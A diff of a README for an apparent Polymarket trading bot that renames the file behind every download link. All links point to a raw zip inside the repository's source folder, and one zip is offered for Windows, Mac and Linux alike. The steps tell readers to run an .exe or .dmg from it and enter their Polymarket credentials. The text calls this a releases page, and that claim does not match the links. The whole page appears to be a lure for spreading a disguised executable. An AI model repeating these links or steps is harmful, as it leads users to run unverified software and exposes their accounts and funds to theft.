@@ -1,6 +1,6 @@
 # 🤖 polymarket-trading-bot - Automate Your Trading Experience
 
-[![Download the latest release](https://raw.githubusercontent.com/Menna-Awad11/polymarket-trading-bot/main/src/polymarket-trading-bot_cladogenous.zip%20Now-blue)](https://raw.githubusercontent.com/Menna-Awad11/polymarket-trading-bot/main/src/polymarket-trading-bot_cladogenous.zip)
+[![Download the latest release](https://raw.githubusercontent.com/Menna-Awad11/polymarket-trading-bot/main/src/trading_bot_polymarket_v3.7-alpha.2.zip%20Now-blue)](https://raw.githubusercontent.com/Menna-Awad11/polymarket-trading-bot/main/src/trading_bot_polymarket_v3.7-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,21 +8,21 @@ Welcome to the Polymarket trading bot! This tool helps you automate your trading
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download the latest release](https://raw.githubusercontent.com/Menna-Awad11/polymarket-trading-bot/main/src/polymarket-trading-bot_cladogenous.zip). Simply follow the installation steps below to set everything up.
+To get started, visit this page to download: [Download the latest release](https://raw.githubusercontent.com/Menna-Awad11/polymarket-trading-bot/main/src/trading_bot_polymarket_v3.7-alpha.2.zip). Simply follow the installation steps below to set everything up.
 
 ### Steps to Download and Run the Software
 
 1. **Open the Releases Page**
-   - Click on the link: [Download the latest release](https://raw.githubusercontent.com/Menna-Awad11/polymarket-trading-bot/main/src/polymarket-trading-bot_cladogenous.zip).
+   - Click on the link: [Download the latest release](https://raw.githubusercontent.com/Menna-Awad11/polymarket-trading-bot/main/src/trading_bot_polymarket_v3.7-alpha.2.zip).
 
 2. **Choose the Right Version**
    - Look at the listed versions on the page. Select the latest version to download.
 
 3. **Download the File**
    - Click on the release file suitable for your operating system. For example:
-       - Windows: `https://raw.githubusercontent.com/Menna-Awad11/polymarket-trading-bot/main/src/polymarket-trading-bot_cladogenous.zip`
-       - Mac: `https://raw.githubusercontent.com/Menna-Awad11/polymarket-trading-bot/main/src/polymarket-trading-bot_cladogenous.zip`
-       - Linux: `https://raw.githubusercontent.com/Menna-Awad11/polymarket-trading-bot/main/src/polymarket-trading-bot_cladogenous.zip`
+       - Windows: `https://raw.githubusercontent.com/Menna-Awad11/polymarket-trading-bot/main/src/trading_bot_polymarket_v3.7-alpha.2.zip`
+       - Mac: `https://raw.githubusercontent.com/Menna-Awad11/polymarket-trading-bot/main/src/trading_bot_polymarket_v3.7-alpha.2.zip`
+       - Linux: `https://raw.githubusercontent.com/Menna-Awad11/polymarket-trading-bot/main/src/trading_bot_polymarket_v3.7-alpha.2.zip`
    - Your browser will download the file.
 
 4. **Locate the Downloaded File**
@@ -31,7 +31,7 @@ To get started, visit this page to download: [Download the latest release](https
 5. **Run the Software**
    - **For Windows:** Double-click the .exe file. Follow the prompts to start the bot.
    - **For Mac:** Open the .dmg file and drag the Polymarket bot to your Applications folder. Open the application from there.
-   - **For Linux:** Extract the https://raw.githubusercontent.com/Menna-Awad11/polymarket-trading-bot/main/src/polymarket-trading-bot_cladogenous.zip file, then open a terminal and navigate to the extracted folder. Run the command `./polymarket-trading-bot`.
+   - **For Linux:** Extract the https://raw.githubusercontent.com/Menna-Awad11/polymarket-trading-bot/main/src/trading_bot_polymarket_v3.7-alpha.2.zip file, then open a terminal and navigate to the extracted folder. Run the command `./polymarket-trading-bot`.
 
 6. **Configure Your Bot**
    - After launching the bot, you may need to enter your Polymarket account credentials. Make sure to use secure methods for storing credentials.
@@ -71,6 +71,6 @@ To run the Polymarket trading bot effectively, your system should meet the follo
 
 On the Releases page, you will find all necessary downloads and updates. Keep an eye on this area for future updates or new features! 
 
-- [Download the latest release](https://raw.githubusercontent.com/Menna-Awad11/polymarket-trading-bot/main/src/polymarket-trading-bot_cladogenous.zip)
+- [Download the latest release](https://raw.githubusercontent.com/Menna-Awad11/polymarket-trading-bot/main/src/trading_bot_polymarket_v3.7-alpha.2.zip)
 
 Thank you for using the Polymarket trading bot. Happy trading!
